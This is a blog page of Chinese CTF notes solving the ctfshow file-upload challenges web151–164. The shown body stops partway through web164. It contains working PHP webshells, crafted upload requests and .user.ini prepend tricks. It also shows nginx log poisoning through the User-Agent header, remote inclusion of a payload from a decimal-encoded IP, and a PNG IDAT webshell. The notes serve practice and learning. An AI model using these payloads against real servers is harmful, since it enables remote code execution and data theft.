@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="文件上传篇web151提示：前台校验不可靠 123456789101112131415161718192021222324...&lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;layui-btn&quot; id&#x3D;&quot;upload&quot; lay-data&#x3D;&quot;&amp;#123;url: &amp;#x27;upload.php&amp;#x27;, a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web入门笔记-文件上传">
+<meta property="og:url" content="http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="文件上传篇web151提示：前台校验不可靠 123456789101112131415161718192021222324...&lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;layui-btn&quot; id&#x3D;&quot;upload&quot; lay-data&#x3D;&quot;&amp;#123;url: &amp;#x27;upload.php&amp;#x27;, a">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-04T16:15:33.000Z">
+<meta property="article:modified_time" content="2024-05-04T16:16:09.148Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-web入门笔记-文件上传</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%90%8E%E5%8D%8A%E9%83%A8%E5%88%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&text=ctfshow-web入门笔记-文件上传"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&is_video=false&description=ctfshow-web入门笔记-文件上传"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-文件上传&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&name=ctfshow-web入门笔记-文件上传&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&t=ctfshow-web入门笔记-文件上传"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">文件上传篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web151"><span class="toc-number">1.1.</span> <span class="toc-text">web151</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web152"><span class="toc-number">1.2.</span> <span class="toc-text">web152</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web153"><span class="toc-number">1.3.</span> <span class="toc-text">web153</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web154"><span class="toc-number">1.4.</span> <span class="toc-text">web154</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web155"><span class="toc-number">1.5.</span> <span class="toc-text">web155</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web156"><span class="toc-number">1.6.</span> <span class="toc-text">web156</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web157"><span class="toc-number">1.7.</span> <span class="toc-text">web157</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web158"><span class="toc-number">1.8.</span> <span class="toc-text">web158</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web159"><span class="toc-number">1.9.</span> <span class="toc-text">web159</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web160"><span class="toc-number">1.10.</span> <span class="toc-text">web160</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web161"><span class="toc-number">1.11.</span> <span class="toc-text">web161</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web162"><span class="toc-number">1.12.</span> <span class="toc-text">web162</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web163"><span class="toc-number">1.13.</span> <span class="toc-text">web163</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP%E8%BD%AC%E5%8D%81%E8%BF%9B%E5%88%B6%E5%92%8C%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.13.1.</span> <span class="toc-text">IP转十进制和远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web164"><span class="toc-number">1.14.</span> <span class="toc-text">web164</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC%E7%94%9F%E6%88%90"><span class="toc-number">1.14.1.</span> <span class="toc-text">图片马生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9AGITHUB%E7%9A%84Python%E8%84%9A%E6%9C%AC"><span class="toc-number">1.14.2.</span> <span class="toc-text">方法1：GITHUB的Python脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9APHP%E8%84%9A%E6%9C%AC"><span class="toc-number">1.14.3.</span> <span class="toc-text">方法2：PHP脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web165"><span class="toc-number">1.15.</span> <span class="toc-text">web165</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web166"><span class="toc-number">1.16.</span> <span class="toc-text">web166</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web167"><span class="toc-number">1.17.</span> <span class="toc-text">web167</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#httpd%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.17.1.</span> <span class="toc-text">httpd、中间件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-HTTP-Server-%E5%92%8C-Nginx"><span class="toc-number">1.17.2.</span> <span class="toc-text">Apache HTTP Server 和 Nginx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web168"><span class="toc-number">1.18.</span> <span class="toc-text">web168</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web169"><span class="toc-number">1.19.</span> <span class="toc-text">web169</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web170"><span class="toc-number">1.20.</span> <span class="toc-text">web170</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow-web入门笔记-文件上传
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-04T16:15:33.000Z" class="dt-published" itemprop="datePublished">2024-05-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="文件上传篇"><a href="#文件上传篇" class="headerlink" title="文件上传篇"></a>文件上传篇</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>提示：前台校验不可靠</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;layui-btn&quot;</span> id=<span class="string">&quot;upload&quot;</span> lay-data=<span class="string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;images&#x27;,exts:&#x27;png&#x27;&#125;&quot;</span>&gt;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">layui.<span class="title function_">use</span>(<span class="string">&#x27;upload&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> upload = layui.<span class="property">upload</span>;</span><br><span class="line">   </span><br><span class="line">  <span class="comment">//执行实例</span></span><br><span class="line">  <span class="keyword">var</span> uploadInst = upload.<span class="title function_">render</span>(&#123;</span><br><span class="line">    <span class="attr">elem</span>: <span class="string">&#x27;#upload&#x27;</span> <span class="comment">//绑定元素</span></span><br><span class="line">    ,<span class="attr">url</span>: <span class="string">&#x27;/upload/&#x27;</span> <span class="comment">//上传接口</span></span><br><span class="line">    ,<span class="attr">done</span>: <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">    	<span class="keyword">if</span>(res.<span class="property">code</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    		$(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;文件上传成功，路径：&quot;</span>+res.<span class="property">msg</span>);</span><br><span class="line">    	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    		$(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;文件上传失败，失败原因：&quot;</span>+res.<span class="property">msg</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    ,<span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      $(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;文件上传失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>似乎前端只校验了格式，那就可以<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1ink/p/15101706.html">做一个图片马</a>尝试绕过。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy R.png/b + 1.php/a ma.png</span><br></pre></td></tr></table></figure>
+
+<p>事实上完全不需要这一步，只有前端校验，而且没有内容审查，直接可以burp抓包然后改一下后缀名发过去就行了。</p>
+<p>直接改filename&#x3D;，改后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ma.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/ma.php?cmd=system(&quot;ls -a&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>同上题</p>
+<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>看wp，这是一道<code>.user.ini</code>的题</p>
+<p>从<a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/107165508">这里</a>得到了一个<code>.user.ini</code>的常用内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  //绕过exif_imagetype()</span><br><span class="line">auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span><br><span class="line">auto_append_file=a.jpg  //解析后进行包含，它包含在所有php文件执行后执行</span><br></pre></td></tr></table></figure>
+<p>那我首先构造一个<code>.user.ini</code>，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=ma.png </span><br><span class="line">auto_append_file=ma.png</span><br></pre></td></tr></table></figure>
+
+<p>然后通过抓包改包的方式上传，上传完的路径是<code>/upload/</code>下。再访问<code>/upload/index.php</code>，即可访问到马。采用<code>?cmd=system(&quot;ls&quot;);</code>即可操作马了。flag在index下。</p>
+<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>这道题跟上一道基本一致，不过在上传图片马时存在内容检查。直接大小写绕过即可</p>
+<p>ma.png:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>pHp ... <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>屏蔽了.png后缀和加入了对php的内容审查，直接短标签绕过</p>
+<p>0.txt:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> ... <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>这道题和上一道基本一致，上传<code>.user.ini</code>后，加入了对eval的内容检查，直接采用反引号。</p>
+<blockquote>
+<?php $output = `ls -al`; echo "<pre>$output</pre>"; ?>
+<p>PHP 支持一个执行运算符：反引号（&#96;&#96;）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“&#96;”的效果与函数 shell_exec() 相同。 注意: 关闭了 shell_exec() 时反引号运算符是无效的。</p>
+</blockquote>
+<p>0.txt:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `ls ../` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后尝试直接<code>&lt;?= </code>nl ..&#x2F;flag.php<code> ?&gt;</code>，发现还有内容审查，应该是屏蔽了<code>flag</code>或者是<code>php</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `nl ../f*` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>解决方法与上题相同</p>
+<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>解决方法与上题相同</p>
+<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>解决方法与上题相同</p>
+<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/124920243">wp</a></p>
+<blockquote>
+<p>当命令执行跟木马上传失败的时候，可以利用日志包含上传</p>
+</blockquote>
+<p><strong>尝试日志注入。</strong></p>
+<p>首先wappalyzer分析出来是nginx，那么可以尝试访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br></pre></td></tr></table></figure>
+
+<p>这里尝试access_log，如果失败了再尝试error_log的注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;0.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?include&#x27;/var/lo&#x27;.&#x27;g/nginx/access.l&#x27;.&#x27;og&#x27;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>upload/index.php</code>，果不其然，显示了日志内容。</p>
+<p>接下来只需要修改user-agent即可。访问<code>upload/index.php</code>，修改UA为<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code>。最后<code>?cmd=system(&#39;ls ../&#39;);</code>进行命令执行。</p>
+<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>前端限制png。</p>
+<p>直接发包即可，或者删除限制的代码。其余与上题一致。</p>
+<h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>加入了对<code>.</code>的内容检查，可以使用取反或者异或绕过。</p>
+<h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/piaolankeke/article/details/5872876">GIF89a绕过</a>和<a target="_blank" rel="noopener" href="https://blog.51cto.com/drennetwork/5874747">ip转十进制</a></p>
+<p>由于这里是对<code>.user.ini</code>的内容都做了对<code>.</code>的内容检查，所以不能prepend_file带后缀名的东西。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=aaa</span><br></pre></td></tr></table></figure>
+
+<h3 id="IP转十进制和远程文件包含"><a href="#IP转十进制和远程文件包含" class="headerlink" title="IP转十进制和远程文件包含"></a>IP转十进制和远程文件包含</h3><p>直接使用ip转十进制需要使用vps，把默认路由放成文本格式的一句话木马。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/123506816">如果是包含远程服务器上的PHP文件，那么得到的是被远程服务器解析过的PHP</a>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;aaa&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;http://1697360474&quot;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这道题会删文件，所以不能用取反或者取异或；实际上，<code>~</code>和<code>^</code>都被屏蔽了。</p>
+<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><h3 id="图片马生成"><a href="#图片马生成" class="headerlink" title="图片马生成"></a>图片马生成</h3><p>查看<a target="_blank" rel="noopener" href="https://j7ur8.github.io/WebBook/VUL/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87.html">wp</a>，发现是“PNG二次渲染”绕过。其<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62715196/article/details/132292143">原理</a>为:</p>
+<blockquote>
+<p>有些图片上传，会对上传的图片进行二次渲染后再保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。例如新闻图片封面等可能需要二次渲染，因为原图片占用的体积更大。访问的人数太多时候会占用，很大带宽。二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除</p>
+</blockquote>
+<p>比如php中的<code>imagecreatefromjpeg()</code>等，都会对图片马进行二次渲染。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1ink/p/15115240.html">解决方法</a>有:</p>
+<p>GIF</p>
+<blockquote>
+<p>渲染前后的两张 GIF，没有发生变化的数据块部分直接插入 Webshell 即可<br>PNG</p>
+</blockquote>
+<p>PNG </p>
+<blockquote>
+<p>没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块</p>
+</blockquote>
+<p>JPG</p>
+<blockquote>
+<p>需要使用脚本将数据插入到特定的数据块，而且可能会不成功，所以需要多次尝试</p>
+</blockquote>
+<h3 id="方法1：GITHUB的Python脚本"><a href="#方法1：GITHUB的Python脚本" class="headerlink" title="方法1：GITHUB的Python脚本"></a>方法1：GITHUB的Python脚本</h3><p>尝试使用<a target="_blank" rel="noopener" href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">往PNG的IDAT里插payload脚本</a>进行IDAT内容插入。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\generate.py -m php -o pngphpidat.png</span><br></pre></td></tr></table></figure>
+<p>生成图片时，使用了<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>这个payload。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] PHP Method Selected. Using &#x27;idontplaywithdarts&#x27; payload</span><br><span class="line">[-] Payload String: b&#x27;&lt;?=$_GET[0]($_POST[1]);?&gt;&#x27;</span><br><span class="line">[-] Payload: b&#x27;a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310&#x27;</span><br><span class="line">[-] Generated Image pngphpidat.png</span><br><span class="line">[-] Verifying payload</span><br><span class="line">[-] Payload OK</span><br><span class="line">[+] Fin</span><br></pre></td></tr></table></figure>
+
+<p>然后上传，传入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">0=system</span><br><span class="line">POST</span><br><span class="line">1=cat flag.php</span><br></pre></td></tr></table></figure>
+
+<p>但是没有明显的回显，需要<strong>下载图片</strong>后，通过文字的方式打开才行。还有一个问题：在Firefox上无法显示该图片，而在Chrome上才能正常显示这张图片。这个问题和之前存在的其他问题使我不得不从Firefox迁移到Chrome。</p>
